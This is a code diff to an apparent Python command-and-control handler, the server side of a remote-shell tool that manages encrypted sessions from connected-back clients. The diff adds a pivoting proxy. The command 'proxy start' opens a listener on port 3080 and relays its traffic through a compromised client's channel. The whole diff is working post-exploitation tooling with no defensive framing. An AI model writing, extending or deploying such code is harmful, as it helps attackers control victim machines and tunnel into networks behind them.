@@ -34,6 +34,63 @@ GOOD = Style.BRIGHT + Fore.GREEN + "\n[+] " + Style.RESET_ALL
 logging.basicConfig(filename='handler.log',level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
 logging.critical("----------START OF NEW LOG----------")
 
+class ProxyConnection:
+	def __init__(self, channel, client):
+		self.channel = channel
+		self.client = client
+		
+		t = StoppableThread(target=self.start)
+		t.daemon = True
+		t.start()
+		
+	def start(self):
+		for f in [self.local_to_remote, self.remote_to_local]:
+			t = StoppableThread(target=f)
+			t.daemon = True
+			t.start()
+			
+	def send(self, data):
+		self.channel.write_output(data)
+		
+	def recv(self):
+		return self.channel.read_input()
+		
+	def local_to_remote(self):
+		ct = threading.currentThread()
+		while not ct.stopped():
+			data = self.client.recv(4096)
+			if not data: return
+			self.send(data)
+			
+	def remote_to_local(self):
+		ct = threading.currentThread()
+		while not ct.stopped():
+			data = self.recv()
+			self.client.sendall(data)		
+
+class ProxyListener:
+	def __init__(self, client):
+		logging.debug("New proxy listener created for client #"+str(client.id))
+		self.client = client
+		self.sock = socket.socket()
+		self.sock.bind(("0.0.0.0",3080))
+		self.sock.listen(5)
+		
+		t = StoppableThread(target=self.start)
+		t.daemon = True
+		t.start()
+		
+	def start(self):
+		ct = threading.currentThread()
+		while not ct.stopped():
+			local_client, addr = self.sock.accept()
+			logging.debug("New proxy connection")
+			channel = self.client.transport.create_channel()
+			self.client.transport.signal("CREATE_CHANNEL:"+channel.id)
+			time.sleep(0.2)
+			self.client.transport.signal("CREATE_PROXY:"+channel.id)
+			ProxyConnection(channel, local_client)
+			
 class StoppableThread(threading.Thread):
 	"""
 	Thread that can be stopped by an external force.
@@ -97,6 +154,7 @@ class Transport:
 		self.signal_channel = Channel(chr(254), self.master_queue) # Channel used for signalling: Requesting new channels, etc.
 		
 		self.channels = {chr(97):self.user_channel, chr(254):self.signal_channel}
+		self.free_channel_id = 1
 		
 		self.disconnected = False
 		
@@ -166,8 +224,13 @@ class Transport:
 		logging.debug("Sending signal to client #"+str(self.client_id)+": "+data)
 		self.master_queue.put(self.signal_channel.id+data)
 				
-	def create_channel(self, id):
-		self.channels[id] = Channel(id, self.master_queue)
+	def create_channel(self):
+		id = chr(self.free_channel_id)
+		self.free_channel_id += 1
+		chan = Channel(id, self.master_queue)
+		self.channels[id] = chan
+		return chan
+		
 		
 class Client:
 	"""
@@ -176,6 +239,7 @@ class Client:
 	def __init__(self, id, cli, ip, port, aes_obj):
 		self.transport = Transport(cli, ip, port, id, aes_obj, self)
 		self.id = id
+		self.proxy_listener = None
 		
 	def send(self, data):
 		self.transport.user_channel.write_output(data)
@@ -198,7 +262,13 @@ class Client:
 			except KeyboardInterrupt:
 				print INFO + "Backgrounding session."
 				return True
+				
+			if not user_input: continue
 			logging.debug("Got user input: "+user_input)
+			
+			if user_input == "proxy start":
+				self.proxy_listener = ProxyListener(self)
+				user_input = "cd ."
 
 			self.send(user_input)
 			
@@ -255,6 +325,7 @@ class Handler:
 		ct = threading.currentThread()
 		while not ct.stopped():
 			cli, addr = self.sock.accept()
+			logging.info("New client connection")
 			address, port = addr
 			
 			id = self.current_id
